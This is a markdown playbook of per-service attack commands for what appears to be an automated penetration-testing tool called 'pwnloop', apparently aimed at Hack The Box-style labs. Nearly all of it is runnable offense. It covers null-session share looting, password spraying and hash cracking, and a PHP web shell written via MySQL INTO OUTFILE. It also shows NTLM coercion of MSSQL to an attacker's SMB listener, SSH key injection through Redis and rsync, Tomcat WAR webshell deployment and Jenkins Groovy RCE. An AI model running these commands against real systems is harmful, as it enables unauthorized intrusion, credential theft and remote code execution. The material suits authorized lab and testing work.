# Per-service playbooks

## SMB (139/445)

```bash
pwnloop x "nxc smb $T"                                  # OS, domain, signing
pwnloop x "nxc smb $T -u '' -p '' --shares"             # null session
pwnloop x "nxc smb $T -u 'guest' -p '' --shares"
pwnloop x "smbclient -N -L //$T/"
pwnloop x "smbclient -N //$T/ShareName -c 'recurse ON; ls'"
pwnloop x "smbmap -H $T -u guest"
```
Signing disabled is a relay opportunity in AD environments. Readable shares:
pull everything and grep for passwords, `.ps1`, `.vbs`, `web.config`,
`unattend.xml`, `Groups.xml` (cpassword), KeePass databases.

```bash
pwnloop x "smbclient -N //$T/Share -c 'prompt OFF; recurse ON; mget *'"
pwnloop x "grep -ariE 'password|pwd|secret|connectionstring' /engagements/$NAME/loot | head -50"
```

RID cycling to enumerate users without credentials:
```bash
pwnloop x "nxc smb $T -u guest -p '' --rid-brute 4000"
pwnloop x "enum4linux-ng -A $T"
```

## FTP (21)

```bash
pwnloop x "ftp -n $T <<< $'user anonymous anonymous\nbinary\nls -la\nprompt off\nmget *\nbye'"
```
Check whether the FTP root is also the web root — an upload there is instant
RCE. Note the server version; vsftpd/ProFTPD have famous backdoored builds.

## SSH (22)

Record the version. Do not brute force. Once you have any username list plus a
password from elsewhere, spray it. Private keys found on disk go in `loot/`,
`chmod 600`, then `ssh -i`. Passphrase-protected keys:
```bash
pwnloop x "ssh2john id_rsa > /engagements/$NAME/loot/key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/key.hash"
```

## DNS (53)

```bash
pwnloop x "dig axfr @$T machine.htb"                # zone transfer
pwnloop x "dnsenum --dnsserver $T machine.htb"
```
A successful AXFR usually hands you every vhost on the box.

## SNMP (161/udp)

```bash
pwnloop x "onesixtyone $T -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
pwnloop x "snmpwalk -v2c -c public $T | tee /engagements/$NAME/scans/snmp.txt"
pwnloop x "snmpwalk -v2c -c public $T 1.3.6.1.2.1.25.4.2.1.2"   # running processes
```
Process listings frequently contain credentials passed on the command line.

## Kerberos (88)

An open `88` = a KDC = you can enumerate and spray users with **no credential**
via pre-auth. Reach for `kerbrute` first (built in; see `references/ad.md`):

```bash
pwnloop x "kerbrute userenum -d <domain> --dc $T /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
```
It also surfaces AS-REP-roastable accounts as it goes. Mind the lockout policy.

## LDAP (389/636)

```bash
pwnloop x "ldapsearch -x -H ldap://$T -s base namingcontexts"
pwnloop x "ldapsearch -x -H ldap://$T -b 'DC=machine,DC=htb' | tee /engagements/$NAME/scans/ldap.txt"
```
Grep the dump for `description`, `userPassword`, `info` — admins park passwords
in those fields constantly.

## NFS (2049)

```bash
pwnloop x "showmount -e $T"
pwnloop x "mkdir -p /mnt/nfs && mount -t nfs $T:/export /mnt/nfs -o nolock"
```
`no_root_squash` on an export means you can drop a SUID root binary there and
execute it on the target.

## MySQL (3306) / MSSQL (1433) / PostgreSQL (5432)

```bash
pwnloop x "mysql -h $T -u root -p''  -e 'show databases;'"
pwnloop x "nxc mssql $T -u sa -p 'password' --local-auth -q 'SELECT @@version'"
pwnloop x "nxc mssql $T -u sa -p 'password' --local-auth -X 'whoami'"   # xp_cmdshell
```
MySQL with FILE privilege: `SELECT LOAD_FILE('/etc/passwd')` and
`SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'`.

**MSSQL with no privileges at all is still a credential primitive.** A login
mapped to `guest` with no readable databases can usually still run the
directory extended procedures, which make the *SQL service account*
authenticate outbound to a UNC path you choose:

```bash
# listener first
pwnloop x "python3 -u /usr/share/doc/python3-impacket/examples/smbserver.py share /engagements/<e>/www -smb2support"
# then coerce — vary the share name on every retry, Windows negative-caches it
pwnloop x "impacket-mssqlclient user:pass@$T <<< 'EXEC master.sys.xp_dirtree \"\\\\<tun0-ip>\\pwn01\", 1, 1;'"
```

`xp_dirtree`, `xp_fileexist` and `xp_subdirs` are all executable by `public` by
default. The result is a NetNTLMv2 for the service account — crack it offline
(`john --format=netntlmv2`), it cannot be relayed to a DC with signing
required. If the listener prints nothing, do not assume failure: see
`foothold.md` on reading the hash off the wire.

## Redis (6379)

```bash
pwnloop x "redis-cli -h $T info; redis-cli -h $T keys '*'"
```
Unauthenticated Redis → write an SSH key into a user's `authorized_keys`, or a
web shell into the web root, via `CONFIG SET dir` + `CONFIG SET dbfilename`.

## WinRM (5985/5986)

```bash
pwnloop x "nxc winrm $T -u user -p pass"
pwnloop x "evil-winrm -i $T -u user -p pass"
pwnloop x "evil-winrm -i $T -u user -H <ntlm-hash>"
```
The fastest route to an interactive Windows shell once you hold credentials.

## RPC (135/593)

```bash
pwnloop x "rpcclient -U '' -N $T -c 'enumdomusers'"
pwnloop x "rpcclient -U '' -N $T -c 'querydispinfo'"
```

## MQTT (1883, 8883/TLS)

A message broker on a server that has no business running one — a domain
controller, say — is worth more than any web port on the same host. Brokers are
routinely deployed with anonymous access on both read *and* write.

```bash
pwnloop x "nmap -p1883 --script mqtt-subscribe $T"
pwnloop x "mosquitto_sub -h $T -p 1883 -t '#' -t '\$SYS/#' -v"      # everything
pwnloop x "mosquitto_pub -h $T -p 1883 -t 'some/topic' -m 'x' -d"   # write test
```

Subscribe to `#` *and* `$SYS/#` — the second is the broker's own status tree and
leaks connected client IDs, source addresses and usernames. Telemetry payloads
routinely carry internal hostnames, IP ranges and health-check URLs, which is a
free network map from an unauthenticated position.

If publishing is allowed, check whether anything *consumes* what you write before
building on it: a topic whose payload contains a `url` field is only a coercion
primitive if some agent fetches it. Publish a URL pointing at your listener and
watch — if nothing calls back, the topics are publish-only telemetry and writing
to them buys you nothing.

## SMTP / IMAP / POP3 (25/587/143/110/993/995)

```bash
pwnloop x "nc -nv $T 25"                                   # banner, then VRFY/EXPN
pwnloop x "smtp-user-enum -M VRFY -U users.txt -t $T"      # user enumeration
pwnloop x "swaks --to a@$T --from b@x --server $T --body 'test'"  # open relay / phishing
```
Internal SMTP that accepts mail is a phishing/second-order-XSS vector when a
human or bot reads it. Read any mailbox you get creds for — passwords land in
inboxes.

## rsync (873)

```bash
pwnloop x "rsync --list-only rsync://$T/"                  # list modules
pwnloop x "rsync -av rsync://$T/<module>/ loot/rsync/"     # pull, often anon
pwnloop x "rsync -av loot/key.pub rsync://$T/<module>/home/user/.ssh/authorized_keys"
```
A writable module mapped into a home directory = SSH key write.

## Java surfaces — RMI / JMX / JDWP (1099/1090/9010/8000/…)

- **RMI/JMX** (`1099`, `9010`) → `nmap --script rmi-dumpregistry`, then
  `beanshooter`/mjet to load an MBean → RCE.
- **JDWP** (`8000` and friends, banner `JDWP-Handshake`) → remote debugger =
  direct RCE: `jdwp-shellifier.py -t $T -p 8000 --cmd 'id'`.

## App servers — Tomcat / Jenkins / JBoss / WebLogic

- **Tomcat manager** (`/manager/html`, `/host-manager`) → default creds
  (`tomcat:tomcat`, `admin:admin`), then deploy a `.war` webshell:
  `nxc … ` or `curl -u user:pass -T shell.war "http://$T:8080/manager/text/deploy?path=/s"`.
- **Jenkins** → `/script` Groovy console = RCE (`"id".execute().text`); unauth
  build config or `@ASYNC` on old versions; read `/credentials.xml` +
  `master.key`+`hudson.util.Secret` to decrypt stored creds.
- **JBoss/WildFly** → JMX console / `jexboss`. **WebLogic** → T3 and CVE
  deserialization (`10.3`/`12.x`).

## Elasticsearch / Kibana / MongoDB / Memcached / CouchDB

```bash
pwnloop x "curl -s http://$T:9200/_cat/indices"           # ES, often unauth → dump docs
pwnloop x "curl -s http://$T:5601/api/status"             # Kibana version → CVE
pwnloop x "mongosh --host $T --eval 'db.adminCommand({listDatabases:1})'"  # unauth Mongo
pwnloop x "memcstat --servers=$T; echo 'stats items' | nc -q1 $T 11211"    # Memcached
pwnloop x "curl -s http://$T:5984/_all_dbs"               # CouchDB; CVE-2017-12635 admin add
```
NoSQL stores are frequently left open with no auth — dump everything and grep for
credentials and tokens.

## Monitoring / infra — Zabbix, IPMI, VNC, X11

- **Zabbix** (`10051`/web) → agent `system.run` RCE, or web default creds
  `Admin:zabbix`.
- **IPMI** (`623/udp`) → `nmap --script ipmi-cipher-zero`;
  dump the RAKP hash and crack (`ipmitool`/`msf ipmi_dumphashes`).
- **VNC** (`5900`) → `nmap --script realvnc-auth-bypass`; captured `.vnc`
  passwords decrypt with `vncpwd`.
- **X11** (`6000`) → `xwd`/`xdotool` over an open display to screenshot/keylog.

## PostgreSQL / MSSQL RCE (beyond the creds check in the DB section)

- **Postgres** superuser → `COPY … FROM PROGRAM 'id'` (9.3+), or the
  `dblink`/large-object routes. `nxc pgsql $T -u postgres -p pass -x id`.
- **MSSQL** `sa` → `xp_cmdshell` (enable via `sp_configure`), or `xp_dirtree`
  coercion (see the MSSQL section above).

## Anything unusual

Netcat the port and read the banner before assuming. Custom services on high
ports are frequently the intended path and are usually a buffer overflow or a
trivially injectable command handler. For crash-triage and exploitation of a
custom binary service, see `references/binary.md`.

```bash
pwnloop x "nc -nv $T <port>"
```
